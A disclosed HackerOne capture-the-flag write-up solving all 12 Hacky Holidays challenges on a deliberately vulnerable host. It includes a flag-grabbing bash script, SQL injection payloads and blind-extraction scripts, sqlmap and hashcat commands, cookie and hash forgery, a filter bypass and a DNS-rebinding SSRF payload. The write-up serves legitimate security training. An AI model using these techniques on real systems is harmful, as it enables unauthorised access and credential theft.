# Grinch Networks compromised!

## Report Details
- **Report ID**: 1066504
- **URL**: https://hackerone.com/reports/1066504
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-26T05:34:39.930Z
- **Disclosed**: 2021-01-11T22:06:15.458Z

## Reporter
- **Username**: zonduu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Grinch Networks compromised!

For fast triage/validation and inspired by @manoelt in other CTF, I made a bash script to find and print all the 12 flags of this CTF.

The script uses curl, wget, google-chrome headless (for flag 2), unzip, grep and sed. If any of these commands is missing, the script might crash or not get all the flags.

```bash
echo -e "NOTE: This script uses: curl, wget, google-chrome headless, unzip, grep and sed. if any of this is missing, the script might not run well\n";

echo -e "[*] Getting all flags...\n";

## Flag 1

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/robots.txt' | grep "flag[^ ]*" -o | sed 's/^/Flag 1\: /';

## Flag 2 - Needs chrome headless browser.

google-chrome --headless --disable-gpu --dump-dom https://hackyholidays.h1ctf.com/s3cr3t-ar3a --no-sandbox | egrep -o "flag\{[a-zA-Z0-9\-]*}" | sed 's/^/Flag 2\: /';

## Flag 3

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0g' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 3\: /';

## Flag 4

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 4\: /';

## Flag 5 - this one is a bit hard. uses 'unzip' to unzip the file, reads it and then deletes everything.

wget 'https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip' 2> /dev/null;
unzip -P "hahahaha" my_secure_files_not_for_you.zip &> /dev/null;
cat flag.txt | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 5\: /';
rm flag.txt xxx.png my_secure_files_not_for_you.zip;

## Flag 6

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' $'https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 6\: /';

## Flag 7

curl -X POST -s -k -d "preview_markup=Hello+%7B%7Bflag%7D%7D&preview_data=%7B%22flag%22%3A%22%7B%7Btemplate:38dhs_admins_only_header.html%7D%7D%22%7D" "https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview" | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 7\: /';

## Flag 8

cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 34'     --data-binary $'username=grinch&password=BahHumbug'     $'https://hackyholidays.h1ctf.com/forum/login' | egrep "token[^ ]*" -o);
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/forum/3/2' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 8\: /';

## Flag 9

curl 'https://hackyholidays.h1ctf.com/evil-quiz/admin' -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "username=admin&password=S3creT_p4ssw0rd-%24" -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o  | sed 's/^/Flag 9\: /';

## Flag 10

cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com' -H $'Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 47' -H $'Upgrade-Insecure-Requests: 1'     --data-binary $'action=login&username=zonduupoc&password=123123'     $'https://hackyholidays.h1ctf.com/signup-manager/' | egrep "token[^ ]*" -o);
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/signup-manager/' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 10\: /';

## Flag 11

cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com' -H $'Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 40' -H $'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687' -H $'Upgrade-Insecure-Requests: 1'     -b $'attackbox=d09d508e78f3975e0199a5e91dde9687'     --data-binary $'username=grinchadmin&password=s4nt4sucks'     $'https://hackyholidays.h1ctf.com/attack-box/login' | egrep "attackbox[^ ]*" -o)
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/attack-box' -s -k |  egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 11\: /';

## flag 12
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 12\: /';
```

Save it in `get-all-flags.sh`, run `chmod +x get-all-flags.sh; ./get-all-flags.sh`. If all works as expected, this should be the output:

{F1130220}

------------------------

## Flag 1 - robots.txt leak

The first flag was found in the /robots.txt directory by common crawl of burp-suite. Once we navigate to it, there is the flag and a hint for the second one:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```
###### note:  In general, this file contains endpoints that that might or might not disclose sensitive endpoints. 

-----------------

## Flag 2 - Into the DOM

From the `/robots.txt` file, we find out of `/s3cr3t-ar3a`. Once we visit it, we note that the site is under construction and there isn't anything sensitive at first look but there is a hint `...If you're allowed access you'll know where to look for the proper page!`.

So we check the source-code and nothing, then we use the inspect element and there is the flag hidden inside a div tag:

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```

----------------------------------


## Flag 3 - who is always the first user?

This flag is located in `/people-rater` where Grinch rates people. Every time we click to know the Grinch's rating of someone, the following GET request is sent to the server:

```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
{redacted}
````
The value of the ID is base64 encoded. Once decoded we notice that it includes a number: `{"id":2} ` .  If we increase that number we will get the others people's rating, but trying the number 1, gives but the rating of Grinch itself (the first user), with the third flag in the response too.

```
GET /people-rater/entry?id=eyJpZCI6MX0g HTTP/1.1
Host: hackyholidays.h1ctf.com
```
```json
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

------------------ 


## Flag 4 - improper access to the API

We start this adventure in `/swag-shop`, it is a broken shop with 3 items and if you try to purchase any of them you get a login prompt which stops you from continuing. I try searching for sqli, guessing the credentials (the usual), but nothing worked.

Then I moved to the api (since we didn't have API endpoints before) and start brute-forcing it. I didn't get anything from the burp wordlist so then I tried the [seclists](https://github.com/danielmiessler/SecLists)'s ones from  Daniel Miessler and was able to find 2 interesting api endpoints: `/sessions` and `/user`.

In `/sessions` we find 8 base64 encoded IDs that look interesting, once I decoded one by one I noticed that the larger one contained a random user ID.

```json
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

Now we go back to the `/user` endpoint that was returning `"error":"Missing required fields"` meaning something was missing there (the user ID). So after playing a bit and trying different things, I finally came across that that you had to add it with the parameter name `uuid` instead of `id`
 (took me a lot longer than expected).

```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
{redacted}
```

```json
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```
-----------------


## Flag 5 - Not so secure login

This challenge starts at `/secure-login`. We encounter a login panel and nothing else. As the usual, I check for sqli, and default creds but unfortunately it didn't work.

If we look at the POST request response, we will notice the server is telling us that the username is incorrect `Invalid Username`, giving us an idea that we can brute-force a little bit to try find the username and then the password.

So again we use a [seclist](https://github.com/danielmiessler/SecLists)  wordlist and quickly find out the username is `access`, and later found that the password is `computer`.

Ok and the flag? Well it is not over.

Now we are authenticated in the site with the following cookie:
`securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`

If we decode the value we notice 2 things:
`{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":falsZX0%`

- We are not the admin
- The syntax is broken so we need to fix it

We change `false` to `true` and fix the syntax and now we are the admin and we are able to download a zip file called `my_secure_files_not_for_you.zip`. This file is password protected so we have to brute-force it.

For this I used john the ripper with a bash script I found in the wild and another wordlist from [seclists top-10kpasswords](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt)

```bash
#!/bin/bash
echo "ZIP-JTR Decrypt Script";
if [ $# -ne 2 ]
then
echo "Usage $0 <zipfile> <wordlist>";
exit;
fi
unzip -l $1
for i in $(john --wordlist=$2 --rules --stdout) 
do
 echo -ne "\rtrying \"$i\" " 
 unzip -o -P $i $1 >/dev/null 2>&1 
 STATUS=$?
 if [ $STATUS -eq 0 ]; then
 echo -e "\nArchive password is: \"$i\"" 
 break
 fi
done
````

So we run `./script.sh my_secure_files_not_for_you.zip wordlist.txt` and in less than few minutes we get that the password is "hahahaha" and inside the file we find the flag: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.

----------------------------------


## Flag 6 - Regex nightmare

In this challenge we are in `/my-diary/?template=entries.html` and we only control the value of this parameter. After some time of fuzzing, I found out that the file `index.php` is accessible to the public so we browse to it.

The page is blank but in the source code we can see the filter the server is doing preventing malicious hackers to access admin.php: `view-source:https://hackyholidays.h1ctf.com/my-diary/?template=index.php`

So unless you are a genius, the fastest way to solve this is by trying and trying until you get it, so that's what I did.

I used a online php editor to try and see how the regex was working and how to bypass it https://paiza.io/es/projects/new. After a few minutes I came to a solution (probably not the cleanest one, but works):

```php
<?php

    $page = 'secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php';
    
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    $page = str_replace("admin.php","",$page);
    $page = str_replace("secretadmin.php","",$page);
    echo $page
?>
```
This bypasses the 3 filters and lets me access the `secretadmin.php` file containing the flag:

```
GET /my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php HTTP/1.1
Host: hackyholidays.h1ctf.com
{redacted}
```
```html
{redacted}
<h4 class="text-center">
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
</h4>
```

---------------------------------

## Flag 7 - Access blocked content with an email template

This challenge starts in `/hate-mail-generator`. There we can see the "guess that" email, with a really weird markup:

```markdown
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

But when clicking the `preview` button both `{{template:cbdj3_grinch_header.html}}` and `{{template:cbdj3_grinch_footer.html}}` were replaced with images. 

{F1121611}

Interesting, at first look seems like server-side template injection might be possible with `{{}}` to try and read something sensitive.

After a bit of fuzzing resulting in finding https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and understanding what was happening in https://hackyholidays.h1ctf.com/hate-mail-generator/new when trying to create an email I came with the solution, but let me explain my thought process step by step.

In https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ we have 3 files. The 3 of them return code 403 when trying to read/view them directly, bue we already know the content of 2 of them because we already saw them in `https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030`. There is one last file that we didn't see yet: `38dhs_admins_only_header.html`, and that's our objective.

In `/hate-mail-generator/new` it is possible to preview the content of what we write (we can't create anything). 

The POST request body to preview goes as follow (we can url-decode and works anyway):

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello{{name}}+....+whatever&preview_data={"name":"Alice","email":"alice@test.com"}
```

```
HelloAlice .... whatever
```

`{{name}}` was replaced with `Alice`, which is declared in the "preview_data" value. Changing Alice for other word and repeating the request, would also cause that word  to be replaced in `{{name}}` when previewing it.

Ok what if we try to modify those values and see what happens?

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
preview_markup=Hello+{{name}}+email:+{{email}}&preview_data={"name":"zonduu","email":"murphy@hacktheplanet.com"}
```

```
Hello zonduu email: murphy@hacktheplanet.com
```

Basically the logic is, what you declare in "preview_data" then you can call it in "preview_markup". So then we go back to `/hate-mail-generator/templates/ ` and get the name of the last file we have pending to see. This [endpoint](https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030) was useful to know how to put the correct syntax when declaring the template.

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
preview_markup={{flag}}&preview_data={"flag":"{{template:38dhs_admins_only_header.html}}"}
```

{F1121646}

-------------------------------------------------------

## Flag 8 - Github creds leak

We start this challenge in `/forum/`. We have 2 Posts that we can see and one private with the message `You need to be an admin to view these posts`.

A quick look-up throw all application and after failed attempts of IDORs like /forum/{1-200} or guessing the credentials of Grinch or Max I came across with the admin login interface https://hackyholidays.h1ctf.com/forum/phpmyadmin after a quick fuzz with the burp's content discovery wordlist.

At this point I was really stuck, because I couldn't guess the default creds of `phpmyadmin`, so I asked for a hint to a friend and he sent me a photo of the github logo...

A quick google search revealed that @Adam (the creator of this whole challenge) had a github repo with source code of this application https://github.com/Grinch-Networks/forum. I don't know much php so this step took me longer than expected but in this commit: https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae the credentials to log in are disclosed, exactly in this line:

`self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`

So we go back to https://hackyholidays.h1ctf.com/forum/phpmyadmin, log in with the username `forum` and password `forum` and we are in.

There we have the 2 available usernames (grinch and max), and their passwords that are md5 encrypted:

{F1122758}

Ok no problem, I downloaded [hashcat](https://hashcat.net/hashcat/) in my new notebook and [rockyou.txt](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz) wordlist and run it. After 3 seconds, hashcat tried the +14,3 Million passwords but couldn't get it. At this time I got a bit confused because I thought that I might have to do a complete brute-force (letter by letter, without wordlist).

Lucky for me @Adam commented this on the official Hackerone Discord. 

{F1130253}

So I added a hashcat rule: {F1122762} that takes every single line of you wordlist and makes it case sensitive. If your wordlist has the word `abc`, this rule will make hashcat try `Abc`, `aBc`, `abC`, `ABC`, etc.

```powershell
.\hashcat.exe -m 0 -a 0 -o out .\hash .\rockyou.txt --force -potfile-disable -r toggle5.rule --workload-profile=3
```

and a few seconds later I got the password which was `BahHumbug` and then in the private post there was the flag:

{F1122783}

----------------------- 

## Flag 9 - Second order SQLi

We start this challenge in `/evil-quiz`.  We have a quiz that receives input in the field `name`, and if we click enter, it makes a POST request to the server like this:

```
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Cookie: session=b519f0f0b323624b25663d3565cc8c2a

name=asdasd
```

The next request is the actual 3 question quiz (which has no effect at all, so we don't talk about it) and then we have the `/evil-quiz/score` endpoint that will tell you **how many people made the quiz with your name**.

So after quite a lot of time manually fuzzing and trying to automate a bit of it, we get to know that the server is vulnerable to SQLi, a second order SQLi...

If the server receives a true statement like `99' OR 1=1-- -` then the server will return a lot of users in the response, like for example: 

`There is 565042 other player(s)`

If we send a false statement like `99' OR 5=1-- -` then the server will return (in the second request, remember the quiz one doesn't matter):

`There is 0 other player(s)`

So well, now we can either make our own script, and start digging into the database part by part or we can use a tool designed to do this job easier: [sqlmap](http://sqlmap.org/)

To run it smoothly  and without false positives, is important to run it with 1 thread in this case. Multiple threads would cause false positives as each payload depends on a second request to see if it is a false/true statement.

We save request 1 in req1 file, and the second request in req2. We need to tell sqlmap where request 1 is with the `-r` flag, and where the second request is with `--second-req` flag. Threads 1, lvl 3 and risk 3. Then I added the `--regexp` flag which tells sqlmap when it is a **true** statement, and the regex is to math "There is {more than 2 digits here}". `--force-ssl` is important because sqlmap makes Plain HTTP requests as default and `--technique=B` because we know it is a boolean SQL injection.

The final command to extract the username and password looks like this:

`python.exe .\sqlmap.py -r req1 --second-req req2 --threads 1 --level 3 --risk 3 --regexp="There is [0-9]{1,}[^ ]" -p name --random-agent --proxy https://127.0.0.1:8080 --force-ssl --technique=B -D quiz -T admin --dump`

{F1127472}

Giving me the credential pair of:  `admin/S3creT_p4ssw0rd-$`, then we log in and there is the flag

{F1130243}

---------------------------------------

## Flag 10 - Code review

The flag 10 hunting starts in `/signup-manager/`. After spending some time wasting my time fuzzing, I found out that in the source-code there is a block commented:

`<!-- See README.md for assistance -->`

We browse to `signup-manager/readme.MD` and it automatically downloads a .md file. It points out some interesting files, but the most important one is definitely:  `signupmanager.zip`

In the zip file, we find 4 .php files that aren't important except for index.php that has actually valuable php code to review.

Not going to lie, this was a bit hard for me because I don't like/do code review, and I don't know php code apart from the basics, so I didn't know what to look for.

But in summary, the age parameter when signing up  goes throw `intval()` with a maximum of 3 characters. One of the last versions of php makes intval() function (which gets the base number of the number provided) make a bigger number.

If we provide '1e5' in the age input, it will make as output 100000 and because the server is expecting just 3 numbers or less, it will cause an overflow when creating the user details.

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Upgrade-Insecure-Requests: 1

action=signup&username=fwefgergeg&password=ergegerg&age=1e6&firstname=gergerg&lastname=YYYYYYYYYYYYYYYYYYY
```

The above request will add one or more 'Y' in the admin parameter, making us admin of the website and getting the flag.

{F1130267}

-----------------

## Flag 11 - Manual SQLi and more

One of the hardest challenge, if not the hardest one. We start this challenge in `/r3c0n_server_4fdk59` where there are 3 albums that when clicking them would make the following GET request:

```
GET /r3c0n_server_4fdk59/album?hash=jdh34k HTTP/1.1
Host: hackyholidays.h1ctf.com
```

After quite a long time fuzzing for directories and trying a lot of things, I noticed the `hash` parameter is vulnerable to SQLi:

A valid statement would result in a 404 response, while a false statement would return code 200

- `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+OR+1=1--+-` - code 404
- `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+OR+1=2--+-` - code 200

So I fire up sqlmap and dump the entire DB but there was no flag or anything that I could use to continue with the challenge. Now as I am a sqlmap type of user instead of manually exploiting, I had quite a hard time.

When we view an album, it shows images that are called with the following HTML code:

```html
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9">
```
 
and if decoded the data's value looks like this:

```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

The server is generating an auth code that is bidden to the the file that we want to read. We can't modify the file and try to get arbitrary files because the auth code would be invalid and the server actually validates it perfectly. We will come back to this later.

###### note: This would be a really good vector to try and find vulnerabilities in a real app. Changing the path, deleting the auth code, modifying it, etc.

We know there is an api endpoint because it is mentioned when we arrived at the page:

`We are currently developing an API, apologies for anything that doesn't work quite right`

So we go to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api and start trying to find possible endpoints in `/r3c0n_server_4fdk59/api/*` fuzzing a lot to see if we can find something. We quickly notice that we get code 401 blocking us to access anything, but on this I found a few probably unintended "bugs" that I wanted to share for people reading the report.

When trying to access normal endpoints like `/api/anything` we get 401.  Basically`[a-zA-Z0-9]` returns code 401.

This restriction doesn't apply when we go 2 or more directories depth like `/r3c0n_server_4fdk59/api/abc/here` or when we add a special character in first path like `/r3c0n_server_4fdk59/api/asdasd.` or `/r3c0n_server_4fdk59/api/asdasd!` so I spent a lot of time trying to find a filter bypass to access some random api endpoints like `/api/abc/../FUZZ` or `/api/./FUZZ` but they all were dead ends.

Back to the SQL injection, it is possible to force the server to create an auth code for us, therefore allowing us to fuzz the api for endpoints.

Injecting the following query would make the server create an auth code for the specific file/path we want to see:

`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop'+UNION+SELECT+"2'+UNION+SELECT+1,1,'../api/whatever'+--+-",'12',1--+--`

This would create an image with  in the response, with the '/api/whatever' path and the auth code to view the specified directory.

With this in mind, I wrote a script that would fuzz the api endpoint, grab the urls generated by the server in the response and then make GET request to check if any of them is different from the usual response.

```bash
while read line; do
        curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/${line}%27+--+-%22,%2712%27,1--+-" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/' | anew valid-endpoints > /dev/null;
done < api.txt

while read line; do
        curl -s -k "${line}" > output;
        if cat output | grep 'Invalid content type detected' > /dev/null; then
                echo $line;
        fi
done < valid-endpoints
```

After running it, I found 2 endpoints that returned a different response: `/api/user` and `/api/ping`. But both of this urls were returning:

```
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

`Invalid content type detected`. Since it is expecting an image.

It doesn't end here! Back to the SQL injection.

It is possible to make a boolean based SQLi to guess the username and password via the username and password parameters of the `/api/user` endpoint. When providing a valid letter/number followed by a `%` the server would return `Invalid content type detected` in the response.

I made the following bash script based on that logic to extract the username and later the password:

```bash

# chr function to get ascii chars
chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

while true
do
        for x in {48..57} {97..122};
        do
                letter=$(chr $x);
                #letter=$(urlencode "$letter");
                new="$dis";
                url=$(curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+--" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | grep -v 'DM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMT' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/');

                curl "$url" > output 2> /dev/null;
                if cat output | grep 'Invalid content type detected' > /dev/null; then dis="${dis}${letter}"; echo -ne "\r$dis"; fi
        done
done
```

```
zonduu@localhost:~/h1-ctf# ./2flag11.sh 
grinchadmin
```

Now we modify the script and add the username we just found, and try to get the password:  `?username=grinchadmin%26password=${new}${letter}%25`

```
zonduu@localhost:~/h1-ctf# ./2flag11.sh 
s4nt4sucks
```

With the username and password we found we log in and there is the flag:

{F1130176}

----------------

## Flag 12 - The salted hash

We start this challenge where the last one ended `/attack-box`. There are 3 target IPs and we can "launch a DDoS attack" to the Santa's servers and when we try to launch an attack the following request is sent to the server:

```
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

If  base64 decode it, it shows the destination IP, and a md5 hash:

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

As soon as I saw this I knew I had to change the IP to localhost so we can take down the Grinch, but the server stops us because it validates the hash.

So after a pretty long time of pointless brute-forcing of the hash and some help of friends it is possible to decrypt it and find the salt of the hash. We need to guess that the IP is part of the hash and that the salt is something possible to brute-force from a wordlist (as direct brute-force would take too long for a ctf).

Saved the hashes with their IPs in a file `hashes`:

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```

And then used hashcat with rockyou wordlist: `hashcat -a0 -m 10 -O hashes rockyou.txt --potfile-disable -o out`

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```

The server is using the salt `mrgrinch463` in the sense of salt-password, therefore it is possible to change to a desired IP of our choice and make the correct md5 hash so the server would accept it (it is possible to make any hash of any IP as we know the only salt the server uses).

I start trying payloads to try hit localhost but the server was making proper validation and resolving the hosts so `localtest.me` is blocked as well as all the other payloads of this list https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

It is also blocking domains or IPs if they contain any special character like `@/:`.

All payloads failed until the DNS rebinding  payload. There are multiple ways of doing this but I used the subdomain `7f000001.c0a80001.rbndr.us` that will resolve randomly to `127.0.0.1` or `192.168.0.1`.

After 2 tries, I was able to hit `192.168.0.1` in the filter check and `127.0.0.1` when the DDoS attack was launched and took down the Grinch Networks server. It might work on the first try or might take a couple of tries.

Payload:

- https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9

```json
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
```

If the attack is successful, we take down the Grinch Network server and get redirected to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 and complete the CTF.

{F1130195}

---------------------------

## Impact

- The sum of multiple vulnerabilities resulted in the ability to take down Grinch Networks.

Great CTF and amazing work @Hacker0x01 & @adamtlangley.

Have a nice end of the year, zonduu.

## Attachments
- 1.PNG
- flag-7.PNG
- flag-8.PNG
- toggle5.rule
- flag-8.3.PNG
- flag-9-this.PNG
- flag11.PNG
- final_flag.PNG
- getflags.PNG
- flag-9-flag.PNG
- flag-8.2.PNG
- flag-10.PNG
